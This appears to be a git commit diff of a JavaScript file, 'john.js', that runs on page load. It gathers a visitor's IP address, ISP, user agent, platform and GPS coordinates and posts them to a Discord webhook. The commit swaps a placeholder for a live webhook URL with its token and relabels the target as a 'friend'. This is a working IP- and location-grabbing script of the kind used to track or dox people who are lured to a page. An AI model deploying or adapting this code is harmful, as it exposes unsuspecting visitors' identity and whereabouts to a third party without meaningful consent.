8f7994ac3f370bf91d9c12b4ad686fb91a2d4efa
Anonymous545-lab <briadonfielies123@gmail.com>
2025-02-26 17:49:10 +0200

    Update john.js

--- john.js
+++ john.js
@@ -1,25 +1,23 @@
 window.addEventListener("load", function() {
-    // Fetch IP address and ISP data
     fetch('https://ipapi.co/json/')
     .then(function(response) {
         return response.json();
     })
     .then(function(data) {
         var ipAddress = data.ip;
-        var isp = data.org; // ISP data
+        var isp = data.org;
         var userAgent = navigator.userAgent;
         var platform = navigator.platform;
 
-        // Ask for location permission
         if (confirm("Do you want to allow this site to access your location data?")) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var latitude = position.coords.latitude;
                     var longitude = position.coords.longitude;
 
-                    var webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
+                    var webhookURL = "https://discord.com/api/webhooks/1344321621179109386/zbCmnaOwr86_m999-BdxuJK81VH1kH5zNIeQJI1DqxPxhFoVEYu7-xUa3B-z9TM40sgh";
                     var message = {
-                        "content": `A visitor has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLocation: Latitude ${latitude}, Longitude ${longitude}`
+                        "content": `A friend has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLocation: Latitude ${latitude}, Longitude ${longitude}`
                     };
 
                     fetch(webhookURL, {
